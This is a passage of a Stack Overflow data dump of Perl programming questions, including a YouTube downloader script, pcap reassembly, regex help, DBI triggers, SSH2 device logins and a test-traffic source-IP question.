URL from the command line argument\nmy $url = $ARGV[0] or die \"\\nError: You need to specify a YouTube URL\\n\\n\";\n\n## declare the user defined file name prefix \nmy $prefix = defined($ARGV[1]) ? $ARGV[1] : \"\";\n\n## download the html code from the youtube page\nmy $html = `wget -Ncq -e \"convert-links=off\" --keep-session-cookies --save-cookies /dev/null --no-check-certificate \"$url\" -O-`  or die  \"\\nThere was a problem downloading the HTML file.\\n\\n\";\n\n## collect the title of the page to use as the file name\nmy ($title) = $html =~ m/&lt;title&gt;(.+)&lt;\\/title&gt;/si;\n$title =~ s/[^\\w\\d]+/_/g;\n$title =~ s/_Youtube_//ig;\n$title =~ s/^_//ig;\n$title = lc ($title);\n\n## collect the URL of the video and translate to the proper URL\nmy ($download) = $html =~ /url_encoded_fmt_stream_map([\\s\\S]+?)fallback_host/ig;\n$download =~ s/\\\\u0026/\\&amp;/g;\n$download =~ s/^\\=url%3D//g;\n$download =~ s/%25/%/g;\n$download =~ s/%3A/:/g;\n$download =~ s/%2F/\\//g;\n$download =~ s/%3F/\\?/g;\n$download =~ s/%3D/\\=/g;\n$download =~ s/%252C/%2C/g;\n$download =~ s/%26/\\?/g;\n$download =~ s/%253A/\\:/g;\n\n## print the file name of the video\nprint \"\\n     Download:   $prefix$title.webm\\n\\n\";\n\n## Download the file.\n  my $error_code=system(\"wget -Ncq -e \\\"convert-links=off\\\" --load-cookies /dev/null --tries=50 --timeout=45 --no-check-certificate $download -O $prefix$title.webm &amp;\")&gt;&gt;8;\n</code></pre>\n\n<p><strong>EDIT</strong>\nAfter I run the perl script, the video doesn't download (it has a size of 0 bytes)</p>\n\n<pre><code>$ ./youtube_get_videos.pl http://www.youtube.com/watch?v=ejkm5uGoxs4\n\n     Download:   radscorpion_youtube.webm\n\n$ ls -lh\n-rw-rw-r-- 1 ubuntu ubuntu    0 Sep 14 04:40 radscorpion_youtube.webm\n</code></pre>\n"},{"tags":["perl","macports"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":362,"score":0,"question_id":9115529,"title":"How to change default perl installation to the one installed by macports","body":"<p>I installed perl5.14 via macports. </p>\n\n<p>By typing </p>\n\n<pre><code>which perl\n</code></pre>\n\n<p>I get</p>\n\n<pre><code>/usr/bin/perl\n</code></pre>\n\n<p>How do I change the perl to point the macports one. </p>\n\n<p>My .profile is:</p>\n\n<pre><code>    # MacPorts Installer addition on 2012-02-02_at_14:42:32: adding an appropriate PATH variable for use with MacPorts.\nexport PATH=/opt/local/bin:/opt/local/sbin:$PATH\n# Finished adapting your PATH environment variable for use with MacPorts.\n</code></pre>\n"},{"tags":["perl","pcap"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":88,"score":0,"question_id":12417851,"title":"Perl Net::Pcap::Reassemble","body":"<p>Hello, I am trying to use the Net::Pcap::Reassemble - IP fragment reassembly for Net::Pcap (http://search.cpan.org/~jraftery/Net-Pcap-Reassemble-0.05/Reassemble.pm).  I am trying to reassembly TCP packets and \"tie\"/concatenate the packets streams of interest from TCP sessions and print the \"tied\" hex output for that data of interest/session.  Here is a snippet of the code below and and the printed output I get.  It is apparent I am not calling the module correctly.  The desire end output that I am trying to achieve is at the bottom, taken from the current printed output.  Can you please review and possibly point me into the right direction?  Thank you.</p>\n\n<pre><code>my $user_data;\nmy $header;\nmy $packet;   \n\nmy $err ='';\nmy $pcap = Net::Pcap::open_offline(\"./pcap\", \\$err) \n   or die \"can't open ./pcap...$err\\n\";\n\nNet::Pcap::Reassemble::loop($pcap, -1, \\&amp;process_pkt, '');\nNet::Pcap::close($pcap);\n\nmy $ip;\nmy $tcp;\nmy $payload;\n\nsub process_pkt  {\n\n    my ($user_data, $header, $packet) = @_;\n    $ip      = NetPacket::IP-&gt;decode(eth_strip($packet));\n    $tcp     = NetPacket::TCP-&gt;decode($ip-&gt;{data});\n    $payload = $tcp-&gt;{data};\n\n    my $hexPayload = hexdump(data =&gt; $payload, start_position =&gt; 0) if length $payload;\n    print \"Hex Payload:\". $hexPayload;\n}\n</code></pre>\n\n<p>print output (this is what I currently get, but want to conatenate it together):  </p>\n\n<blockquote>\n  <p>Hex Payload:  0x0000 : 47 45 54 20 2F 6D 61 63 2F 5F 62 61 73 65 5F 76 : GET./mac/_base_v\n  0x0010 : 31 2F 73 63 72 69 70 74 2F 6A 71 75 65 72 79 2D : 1/script/jquery-\n  0x0020 : 31 2E 36 2E 31 2E 6A 73 20 48 54 54 50 2F 31 2E : 1.6.1.js.HTTP/1.\n  0x0030 : 31 0D 0A 48 6F 73 74 3A 20 77 77 77 2E 6D 69 63 : 1..Host:.www.mic\n  0x0040 : 72 6F 73 6F 66 74 2E 63 6F 6D 0D 0A 55 73 65 72 : rosoft.com..User\n  0x0050 : 2D 41 67 65 6E 74 3A 20 4D 6F 7A 69 6C 6C 61 2F : -Agent:.Mozilla/\n  0x0060 : 35 2E 30 20 28 4D 61 63 69 6E 74 6F 73 68 3B 20 : 5.0.(Macintosh;.\n  0x0070 : 49 6E 74 65 6C 20 4D 61 63 20 4F 53 20 58 20 31 : Intel.Mac.OS.X.1\n  0x0080 : 30 2E 36 3B 20 72 76 3A 31 33 2E 30 29 20 47 65 : 0.6;.rv:13.0).Ge\n  0x0090 : 63 6B 6F 2F 32 30 31 30 30 31 30 31 20 46 69 72 : cko/20100101.Fir\n  0x00A0 : 65 66 6F 78 2F 31 33 2E 30 0D 0A 41 63 63 65 70 : efox/13.0..Accep\n  0x00B0 : 74 3A 20 2A 2F 2A 0D 0A 41 63 63 65 70 74 2D 4C : t:.<em>/</em>..Accept-L\n  0x00C0 : 61 6E 67 75 61 67 65 3A 20 65 6E 2D 75 73 2C 65 : anguage:.en-us,e\n  0x00D0 : 6E 3B 71 3D 30 2E 35 0D 0A 41 63 63 65 70 74 2D : n;q=0.5..Accept-\n  0x00E0 : 45 6E 63 6F 64 69 6E 67 3A 20 67 7A 69 70 2C 20 : Encoding:.gzip,.\n  0x00F0 : 64 65 66 6C 61 74 65 0D 0A 52 65 66 65 72 65 72 : deflate..Referer\n  0x0100 : 3A 20 68 74 74 70 3A 2F 2F 77 77 77 2E 6D 69 63 : :.http://www.mic\n  0x0110 : 72 6F 73 6F 66 74 2E 63 6F 6D 2F 6D 61 63 2F 72 : rosoft.com/mac/r\n  0x0120 : 65 6D 6F 74 65 2D 64 65 73 6B 74 6F 70 2D 63 6C : emote-desktop-cl\n  0x0130 : 69 65 6E 74 0D 0A 44 4E 54 3A 20 31 0D 0A 43 6F : ient..DNT:.1..Co\n  0x0140 : 6E 6E 65 63 74 69 6F 6E 3A 20 6B 65 65 70 2D 61 : nnection:.keep-a\n  0x0150 : 6C 69 76 65 0D 0A 0D 0A 00 00 00 00 00 00 00 00 : live............</p>\n  \n  <p>Hex Payload:  0x0000 : 48 54 54 50 2F 31 2E 31 20 32 30 30 20 4F 4B 0D : HTTP/1.1.200.OK.\n  0x0010 : 0A 43 61 63 68 65 2D 43 6F 6E 74 72 6F 6C 3A 20 : .Cache-Control:.\n  0x0020 : 6D 61 78 2D 61 67 65 3D 39 30 30 0D 0A 43 6F 6E : max-age=900..Con\n  0x0030 : 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C 69 : tent-Type:.appli\n  0x0040 : 63 61 74 69 6F 6E 2F 78 2D 6A 61 76 61 73 63 72 : cation/x-javascr\n  0x0050 : 69 70 74 0D 0A 43 6F 6E 74 65 6E 74 2D 45 6E 63 : ipt..Content-Enc\n  0x0060 : 6F 64 69 6E 67 3A 20 67 7A 69 70 0D 0A 4C 61 73 : oding:.gzip..Las\n  0x0070 : 74 2D 4D 6F 64 69 66 69 65 64 3A 20 57 65 64 2C : t-Modified:.Wed,\n  0x0080 : 20 30 38 20 4A 75 6E 20 32 30 31 31 20 31 38 3A : .08.Jun.2011.18:\n  0x0090 : 34 35 3A 34 39 20 47 4D 54 0D 0A 41 63 63 65 70 : 45:49.GMT..Accep</p>\n</blockquote>\n\n<p>desired printed output (the above tied/concatenated together):</p>\n\n<blockquote>\n  <p>Hex Payload:  0x0000 : 47 45 54 20 2F 6D 61 63 2F 5F 62 61 73 65 5F 76 : GET./mac/_base_v\n  0x0010 : 31 2F 73 63 72 69 70 74 2F 6A 71 75 65 72 79 2D : 1/script/jquery-\n  0x0020 : 31 2E 36 2E 31 2E 6A 73 20 48 54 54 50 2F 31 2E : 1.6.1.js.HTTP/1.\n  0x0030 : 31 0D 0A 48 6F 73 74 3A 20 77 77 77 2E 6D 69 63 : 1..Host:.www.mic\n  0x0040 : 72 6F 73 6F 66 74 2E 63 6F 6D 0D 0A 55 73 65 72 : rosoft.com..User\n  0x0050 : 2D 41 67 65 6E 74 3A 20 4D 6F 7A 69 6C 6C 61 2F : -Agent:.Mozilla/\n  0x0060 : 35 2E 30 20 28 4D 61 63 69 6E 74 6F 73 68 3B 20 : 5.0.(Macintosh;.\n  0x0070 : 49 6E 74 65 6C 20 4D 61 63 20 4F 53 20 58 20 31 : Intel.Mac.OS.X.1\n  0x0080 : 30 2E 36 3B 20 72 76 3A 31 33 2E 30 29 20 47 65 : 0.6;.rv:13.0).Ge\n  0x0090 : 63 6B 6F 2F 32 30 31 30 30 31 30 31 20 46 69 72 : cko/20100101.Fir\n  0x00A0 : 65 66 6F 78 2F 31 33 2E 30 0D 0A 41 63 63 65 70 : efox/13.0..Accep\n  0x00B0 : 74 3A 20 2A 2F 2A 0D 0A 41 63 63 65 70 74 2D 4C : t:.<em>/</em>..Accept-L\n  0x00C0 : 61 6E 67 75 61 67 65 3A 20 65 6E 2D 75 73 2C 65 : anguage:.en-us,e\n  0x00D0 : 6E 3B 71 3D 30 2E 35 0D 0A 41 63 63 65 70 74 2D : n;q=0.5..Accept-\n  0x00E0 : 45 6E 63 6F 64 69 6E 67 3A 20 67 7A 69 70 2C 20 : Encoding:.gzip,.\n  0x00F0 : 64 65 66 6C 61 74 65 0D 0A 52 65 66 65 72 65 72 : deflate..Referer\n  0x0100 : 3A 20 68 74 74 70 3A 2F 2F 77 77 77 2E 6D 69 63 : :.http://www.mic\n  0x0110 : 72 6F 73 6F 66 74 2E 63 6F 6D 2F 6D 61 63 2F 72 : rosoft.com/mac/r\n  0x0120 : 65 6D 6F 74 65 2D 64 65 73 6B 74 6F 70 2D 63 6C : emote-desktop-cl\n  0x0130 : 69 65 6E 74 0D 0A 44 4E 54 3A 20 31 0D 0A 43 6F : ient..DNT:.1..Co\n  0x0140 : 6E 6E 65 63 74 69 6F 6E 3A 20 6B 65 65 70 2D 61 : nnection:.keep-a\n  0x0150 : 6C 69 76 65 0D 0A 0D 0A 00 00 00 00 00 00 00 00 : live............\n  0x0160 : 48 54 54 50 2F 31 2E 31 20 32 30 30 20 4F 4B 0D : HTTP/1.1.200.OK.\n  0x0170 : 0A 43 61 63 68 65 2D 43 6F 6E 74 72 6F 6C 3A 20 : .Cache-Control:.\n  0x0180 : 6D 61 78 2D 61 67 65 3D 39 30 30 0D 0A 43 6F 6E : max-age=900..Con\n  0x0190 : 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C 69 : tent-Type:.appli\n  0x0200 : 63 61 74 69 6F 6E 2F 78 2D 6A 61 76 61 73 63 72 : cation/x-javascr\n  0x0210 : 69 70 74 0D 0A 43 6F 6E 74 65 6E 74 2D 45 6E 63 : ipt..Content-Enc\n  0x0220 : 6F 64 69 6E 67 3A 20 67 7A 69 70 0D 0A 4C 61 73 : oding:.gzip..Las\n  0x0230 : 74 2D 4D 6F 64 69 66 69 65 64 3A 20 57 65 64 2C : t-Modified:.Wed,\n  0x0240 : 20 30 38 20 4A 75 6E 20 32 30 31 31 20 31 38 3A : .08.Jun.2011.18:\n  0x0250 : 34 35 3A 34 39 20 47 4D 54 0D 0A 41 63 63 65 70 : 45:49.GMT..Accep</p>\n</blockquote>\n"},{"tags":["perl","postgresql"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12419515,"title":"how to create points in postgres from array of lan and lat points","body":"<p>I have arrays of latitude and longitude . Now I want to create array of points from that. How can I do that in postgresql?\nI am writing something like this which is not working.</p>\n\n<pre><code>my $data = { \n  type =&gt; 'Feature',\n  geometry =&gt; {\n    type =&gt; \"Point\",\n    coordinates =&gt; [@lon[0],@lat[0]]\n  }\n};\n</code></pre>\n\n<p>Any help?</p>\n"},{"tags":["regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":12419528,"title":"Perl: Help writing a regular expression","body":"<p>I am trying to write a common regular expression for the below 3 cases:</p>\n\n<ul>\n<li>Supernatural_S07E23_720p_HDTV_X264-DIMENSION.mkv</li>\n<li>the.listener.313.480p.hdtv.x264-2hd.mkv</li>\n<li>How.I.met.your.mother.s02e07.hdtv.x264-xor.avi</li>\n</ul>\n\n<p>Now my regular exoression should remove the series name from the original string i,e the output of above string will be:</p>\n\n<ul>\n<li>S07E23_720p_HDTV_X264-DIMENSION.mkv</li>\n<li>313.480p.hdtv.x264-2hd.mkv</li>\n<li>s02e07.hdtv.x264-xor.avi</li>\n</ul>\n\n<p>Now for the basic case of <code>supernatural string</code> I wrote the below regex and it worked fine but as soon as the series name got multiple words it fails.</p>\n\n<pre><code>$string =~ s/^(.*?)[\\.\\_\\- ]//i; #delimiter can be (. - _ )\n</code></pre>\n\n<p>So, I have no idea how to proceed for the aboves cases I was thinking along the lines of <code>\\w+{1,6}</code> but it also failed to do the required.</p>\n\n<p>PS: Explanation of what the regular expression is doing will be appreciated.</p>\n"},{"tags":["perl","sharepoint2007"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12417571,"title":"Reading/Writing sharepoint Lists using webservices - Which language to use?","body":"<p>I have to read a sharepoint list and do some processing on it. Please suggest which language to use.\nThe platform is Linux.\nI have tried using Perl using this (http://www.squish.net/log/2008/10/11/perl-sharepoint/) but getting issue to connect to sharepoint service (getting 401 errors).</p>\n"},{"tags":["html","django","perl"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12381587,"title":"Process perl script On POST method in Django","body":"<p>I am newbie ,am trying to process perl script on submit button in HTML in Django framework.I will try to be clean and clear what i wann do, Apologies for my English language.</p>\n\n<p>I have build simple registration website using Django framework.In that instead of using Django auth, i want to call perl script and process the new user registration form.</p>\n\n<p>I have written code for simple new user registration form and perl script which takes data from HTML and splits that data and send it to back-end for further process.I successfully accomplished this task using CGI server.</p>\n\n<p>This process i want to call in Django framework .How can I do this .I tried to do it with subprocess but Am not getting solution for this .</p>\n\n<p>Thank You\nPervez    </p>\n"},{"tags":["mysql","perl","dbi","delimiter"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":63,"score":3,"question_id":12417076,"title":"Perl, DBI and the MySQL delimiter","body":"<p>I have a need to be able to issue \"create trigger\" over DBI. I can't seem to get the delimiter command working. Can anyone find a way to make this work?</p>\n\n<p>Code:</p>\n\n<pre><code>use strict;\nuse DBI;\nmy $dbargs = {mysql_auto_reconnect =&gt; 1,\n              AutoCommit           =&gt; 0,\n              RaiseError           =&gt; 1,\n              ShowErrorStatement   =&gt; 1}; \n\nmy $dsn = \"DBI:mysql:database=xdisp;host=cycldev06\";\nmy $dbh = DBI-&gt;connect( $dsn, 'sqluser', '', $dbargs);\n\nmy $sql = qq{ \n    DELIMITER // \n        CREATE TRIGGER `hardware_last_status` BEFORE UPDATE\n            ON `hardware` FOR EACH ROW BEGIN\n                                IF NEW.status != OLD.status AND NEW.last_status = OLD.last_status THEN\n                                    SET NEW.last_status = OLD.status;\n                                END IF;\n                            END\n            //\n};\n\n$dbh-&gt;do($sql);\n</code></pre>\n\n<p>Results:</p>\n\n<pre><code>DBD::mysql::db do failed: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'DELIMITER // \n        CREATE TRIGGER `hardware_last_status` BEFORE UPDATE\n      ' at line 1 at test.pl line 24.\n</code></pre>\n\n<p>and that SQL works fine at the MySQL command line.</p>\n"},{"tags":["perl","rename","partial","utility","lowercase"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":111,"score":4,"question_id":11005845,"title":"How to change partial substrings to mixed case in Perl","body":"<p>The Perl rename utility does a great job in everyday file work, especially in private when I check my MP3 collection now and then.</p>\n\n<p>Some folks have a <em>terrible</em> habit of always capitalizing the artist name, like this</p>\n\n<pre><code>03 - ARTIST NAME - Song Title.mp3\n</code></pre>\n\n<p>I'd like this to be renamed to a more calmly-looking mixed case, like this</p>\n\n<pre><code>03 - Artist Name - Song Title.mp3\n</code></pre>\n\n<p>However, it should be done in an intelligent way, too.</p>\n\n<p>There might be French or Italian titles like:</p>\n\n<pre><code>05 - JEAN BAGUETTE - Honi soit qui mal y pense.mp3\n</code></pre>\n\n<p>or</p>\n\n<pre><code>07 - SIGNORE AL FORNO - Pazzi sono tutti i calciatori.mp3\n</code></pre>\n\n<p>And hence, I do <em>not</em> want these to get changed to mixed case after the <code>-</code>, only the artist part.</p>\n\n<p>One approach, which did not work, was</p>\n\n<pre><code>rename 's/(\\d{1,2} - )([A-Z ]+)([\\s\\S]+)/$1lc($2)$3/' filename\n</code></pre>\n\n<p>I'm posting it anyway, because it always gives you a better clue what I'm trying to do.</p>\n\n<p>I've also tried replacing the <code>$2</code> with a temporary variable (since I am not allowed to change $2 as it's read-only) and do the <code>lc()</code> before printing out the result, but I did not succeed. But I'm quite a Perl beginner, anyhow.</p>\n"},{"tags":["regex","perl","fsm"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":99,"score":0,"question_id":12397592,"title":"Perl finite state machine for quick parsing, regex generation","body":"<p>I need to match very short segments of text (1 to 7 letters), and I know how to specify the acceptable strings in a finite state machine. I think that building a regex for this application would get too messy and difficult to maintain. I need an easy to use module that I can write an FSM in, and it would be a big bonus if the module could produce a regular expression for me to use. Does anyone know of a module that can do this simply?</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":107,"score":0,"question_id":12410405,"title":"perl: Use of uninitialized value and output is truncated","body":"<p>I am trying to use the following script to shuffle the order of sequences (lines) within a file. I'm not sure how to \"initialize\" values -- please help!</p>\n\n<pre><code>print \"Please enter filename (without extension): \";\nmy $input = &lt;&gt;;\nchomp $input;\n\nuse strict;\nuse warnings;\n\nprint \"Please enter total no. of sequence in fasta file: \";\nmy $orig_size = &lt;&gt;*2-1;\nchomp $orig_size;\n\nopen INFILE, \"$input.fasta\"\n   or die \"Error opening input file for shuffling!\";\nopen SHUFFLED, \"&gt;\".\"$input\".\"_shuffled.fasta\"\n   or die \"Error creating shuffled output file!\";\n\nmy @array  = (0); # Need to initialise 1st element in array1&amp;2 for the shift function\nmy @array2 = (0);\nmy $i      = 1;\nmy $index  = 0;\nmy $index2 = 0;\n\nwhile (my @line = &lt;INFILE&gt;){\n\n    while ($i &lt;= $orig_size) { \n\n        $array[$i] = $line[$index];\n        $array[$i] =~ s/(.)\\s/$1/seg;\n\n        $index++;\n        $array2[$i] = $line[$index];\n        $array2[$i] =~ s/(.)\\s/$1/seg;\n\n        $i++;\n        $index++;\n    }\n}\n\nmy $array  = shift (@array); \nmy $array2 = shift (@array2);\n\nfor ($i = my $header_size; $i &gt;= 0; $i--) { \n\n    my $j = int rand ($i+1);\n    next if $i == $j;\n    @array[$i,$j]  = @array[$j,$i];\n    @array2[$i,$j] = @array2[$j,$i];\n}\n\nwhile ($index2 &lt;= my $header_size) { \n\n    print SHUFFLED \"$array[$index2]\\n\";\n    print SHUFFLED \"$array2[$index2]\\n\";\n    $index2++;\n}\nclose INFILE;\nclose SHUFFLED;\n</code></pre>\n\n<p>I'm getting these warnings:</p>\n\n<p><code>Use of uninitialized value in substitution (s///) at fasta_corrector6.pl line 27, &lt;INFILE&gt; line 578914.<br>\nUse of uninitialized value in substitution (s///) at fasta_corrector6.pl line 31, &lt;INFILE&gt; line 578914.<br>\nUse of uninitialized value in numeric ge (&gt;=) at fasta_corrector6.pl line 40, &lt;INFILE&gt; line 578914.<br>\nUse of uninitialized value in addition (+) at fasta_corrector6.pl line 41, &lt;INFILE&gt; line 578914.<br>\nUse of uninitialized value in numeric eq (==) at fasta_corrector6.pl line 42, &lt;INFILE&gt; line 578914.<br>\nUse of uninitialized value in numeric le (&lt;=) at fasta_corrector6.pl line 47, &lt;INFILE&gt; line 578914.<br>\nUse of uninitialized value in numeric le (&lt;=) at fasta_corrector6.pl line 50, &lt;INFILE&gt; line 578914.</code></p>\n"},{"tags":["perl","testing","networking","ip","spoofing"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":157,"score":4,"question_id":12411723,"title":"Spoof IP with Perl LWP","body":"<p>I need to write a little piece of code to simulate traffic from different source IP addresses and I'm wondering if that can be done by spoofing the addresses with Perl?</p>\n\n<p>I tried Net::RAWIP and that worked, but I need to send some more complex HTTP traffic (namely POST data) and was unable to do so with RAWIP</p>\n\n<p>With LWP I tried using ua->local_address but I get this response:</p>\n\n<pre><code>Can't connect to 10.x.x.x:8080\n\nLWP::Protocol::http::Socket: Cannot assign requested address at /usr/lib/perl5/site_perl/5.10.0/LWP/Protocol/http.pm line 51.\n</code></pre>\n\n<p>This is the code I'm using:</p>\n\n<pre><code>#!/usr/bin/perl -w\n\nuse strict ;\nuse warnings ;\nuse LWP::UserAgent ;\nuse URI::URL ;\n\nmy $path = 'http://142.133.114.130:8080' ;\nmy $url = new URI::URL $path;\nmy $ua       = LWP::UserAgent-&gt;new();\n\n$ua-&gt;local_address('10.121.132.112');\n$ua-&gt;env_proxy ;\nmy $effing = 'blaj.jpg' ;\nmy $response = $ua-&gt;post( $url,\n                        'Content-Type' =&gt; \"multipart/form-data\",\n                        'Content' =&gt; [ userfile =&gt; [\"$effing\" ]],\n                        'Connection' =&gt; 'keep-alive' ) ;\nprint $response-&gt;decoded_content();\n</code></pre>\n"},{"tags":["php","mysql","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":53,"score":1,"question_id":12408907,"title":"organise change field values in mysql","body":"<p>i need to sort through a column in my database, this column is my category structure the data thats in the column is city names but not all the names are the same for each city, what i need to do is go through the values in the column i may have 20-40 value that are the same city but written differently i need a script that can interpret them  and change them to a single value </p>\n\n<p>so i may have two values in the city column say:( england > london ) and ( westlondon ) but i need to change to just london, is there a script out there that is capable of interpreting the values that are already there and change them to the value  would want i know the dificult way of doing this one by one but wondered if there was a script in any language that could complete this </p>\n"},{"tags":["perl","variables"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12402054,"title":"storing output of perl command into a variable","body":"<p>This works fine<br>\n<code>system(\"perl -c C:/Users/mytest/scripts/file_name.pm\")</code><br>\nThis command gives many lines of output in cygwin and a single syntak ok line in centos. since ill be using cygwin, what am trying to do is to get this output into a variable and use it later in my program. How can i do it?  </p>\n\n<p>Thanks in advance for your time. </p>\n"},{"tags":["java","perl","json","gui","forms"],"answer_count":0,"favorite_count":0,"up_vote_count":10,"down_vote_count":0,"view_count":9495,"score":10,"question_id":3369735,"title":"JSON GUI creator/editor","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/998832/gui-based-or-web-based-json-editor-that-works-like-property-explorer\">GUI-based or Web-based JSON editor that works like property explorer</a>  </p>\n</blockquote>\n\n\n\n<p>I'm using text files in JSON format as input to my java/perl programs.</p>\n\n<p>I would like to allow novice users to generate such JSON files themselves, following some template. Is there some GUI that allows easy, step-by-step creation of a JSON file?</p>\n\n<p>It should allow filling in fields with text, choosing file locations etc. Also note the input format is not totally fixed - for example there are a couple of arrays where the number of elements can be chosen by the user, so the GUI should account for this flexibility too.</p>\n\n<p>Thanks!</p>\n"},{"tags":["python","perl"],"answer_count":6,"favorite_count":0,"up_vote_count":14,"down_vote_count":0,"view_count":716,"score":14,"question_id":2471942,"title":"In Python what's the best way to emulate Perl's __END__?","body":"<p>Am I correct in thinking that that Python doesn't have a direct equivalent for Perl's <code>__END__</code>?</p>\n\n<pre><code>print \"Perl...\\n\";\n\n__END__\nEnd of code. I can put anything I want here.\n</code></pre>\n\n<p>One thought that occurred to me was to use a triple-quoted string. Is there a better way to achieve this in Python?</p>\n\n<pre><code>print \"Python...\"\n\n\"\"\"\nEnd of code. I can put anything I want here.\n\"\"\"\n</code></pre>\n"},{"tags":["php","web-services","perl","httpresponse"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":82,"score":0,"question_id":12411020,"title":"How to format web service response to be read by Perl?","body":"<p>I'm using Perl to request some information (plain text) from a web service I built. When accessing using the browser, the info is shown perfectly. However, I'm new to handle responses using Perl. I do some database operations successfully, and my problem comes handling the response in Perl, not PHP.</p>\n\n<p>How do I must encode or format the response in order to handle it successfully and output the same plain text in Perl?</p>\n\n<p>EDIT:</p>\n\n<p>Key points to take into consideration</p>\n\n<ul>\n<li>I'm working with CakePHP 2.x (stable).</li>\n<li>The <strong><em>$response->content</em></strong> brings the whole HTML file (including JavaScript and the whole package). I just want to show the plain text in the Perl script.</li>\n<li>The Perl script fails when checking <strong>*$response->is_success*</strong> and goes straight to <strong><em>print \"something went wrong\";</em></strong>.</li>\n</ul>\n\n<p>My php script runs well</p>\n\n<p>PHP code:</p>\n\n<pre><code>&lt;?php\n$this-&gt;layout = 'ajax';\n$this-&gt;autoRender = false;\n// Some database handling here with no problem...\necho \"Plain text with info from database\";\n?&gt;\n</code></pre>\n\n<p>Perl code:</p>\n\n<pre><code>#!/usr/local/bin/perl\nrequire LWP::UserAgent;\nrequire HTTP::Request;\nmy $request = HTTP::Request-&gt;new(GET =&gt; $url);\nmy $userAgent = LWP::UserAgent-&gt;new;\n$userAgent-&gt;timeout(3);\n$userAgent-&gt;env_proxy;\nmy $response = $userAgent-&gt;request($request);\nif ($response-&gt;is_success) {\n    print \"Success!\\n\";\n    #should print plain text AS IS\n}\nelse {\n    print \"something went wrong...\\n\";\n    die $response-&gt;status_line;\n}\n</code></pre>\n"},{"tags":["perl","perl-module"],"answer_count":4,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":332,"score":0,"question_id":8511008,"title":"Perl Net::SSH2 module not working on device list","body":"<p>I am new to Windows Perl and I am trying to use <a href=\"http://p3rl.org/Net%3a%3aSSH2\" rel=\"nofollow\">Net::SSH2</a> on <a href=\"http://strawberryperl.com/\" rel=\"nofollow\">Strawberry Perl</a>. the issue I have the script is unable to connect to device list. I can connect to the first device on the list but unable to connect to 2nd, 3rd so on. did I miss anything. thanks for any suggestion.</p>\n\n<pre><code>#!\\usr\\bin\\Perl\\bin\\perl\n\nuse warnings;\nuse strict;\nuse NET::SSH2;\nuse MIME::Base64;\n\nmy $host = \"C:/temp/devices.txt\"; # input file\nmy $user = \"XXX\"; # your account\nmy $pass = \"XXXXX\"; # your password  64 bit mime\nmy $ssh2 = Net::SSH2-&gt;new();\nmy $result = \"C:/temp/result.txt\"; # output file\n\n$ssh2-&gt;debug(1); # debug on/off\n\nopen(List, '&lt;', \"$host\") or die \"$!\";\nwhile(&lt;List&gt;) {\n    chomp $_;\n    unless ($ssh2-&gt;connect(\"$_\")) {\n        print \"Unable to connect : $_\\n\";\n        next;\n    }\n\n    my $dp=decode_base64(\"$pass\");\n\n    unless ($ssh2-&gt;auth_password(\"$user\",\"$dp\")) {\n        print \"Invalid Password\\n\";\n        exit;\n    }\n\n    my $chan = $ssh2-&gt;channel();\n    $chan-&gt;exec('sh ver');\n\n    my $buflen =100000;\n    my $buf = '0' x $buflen;\n    my $read = $chan-&gt;read($buf, $buflen );\n\n    warn 'More than ', $buflen, ' characters in listing' if $read &gt;= $buflen;\n\n    open (OUTPUT, '&gt;&gt;', $result) or die \"$!\";\n    print OUTPUT \"HOST: $_\\n\\n\";\n    print OUTPUT \"$buf\\n\";\n    print OUTPUT \"\\n\\n\\n\";\n    print OUTPUT\n\n    $chan-&gt;close();\n}\n\nclose (List);\n</code></pre>\n"},{"tags":["perl","emacs"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":83,"score":3,"question_id":12408031,"title":"Emacs Perl mode: Send script/buffer to Perl interpreter?","body":"<p>Say I am editing a Perl file or buffer in Emacs in the default Perl mode (the one that comes with Emacs 23.1.1). </p>\n\n<p>Is there a way to directly send the full file (or buffer) to the Perl interpreter and see the result (on a separate buffer)?</p>\n"},{"tags":["perl","unicode","utf-8"],"answer_count":4,"favorite_count":3,"up_vote_count":8,"down_vote_count":0,"view_count":1373,"score":8,"question_id":2037467,"title":"How can I treat command-line arguments as UTF-8 in Perl?","body":"<p>How do I treat the elements of <code>@ARGV</code> as UTF-8 in Perl?</p>\n\n<p>Currently I'm using the following work-around ..</p>\n\n<pre><code>use Encode qw(decode encode);\n\nmy $foo = $ARGV[0];\n$foo = decode(\"utf-8\", $foo);\n</code></pre>\n\n<p>.. which works but is not very elegant.</p>\n\n<p>I'm using Perl v5.8.8 which is being called from bash v3.2.25 with a LANG set to en_US.UTF-8.</p>\n"},{"tags":["perl","hash","key-value","multiplication"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":79,"score":0,"question_id":12403280,"title":"Multiply all values in hash together in Perl?","body":"<p>I would like to multiply all the values of a hash together without having to call the specific elements. E.g. I <em>DON'T</em> want to do <code>$hash{'kv1'} * $hash{'kv2'} * $hash{'kv3'}</code> because I won't know the number of elements in the hash to do this. </p>\n\n<p>I'm 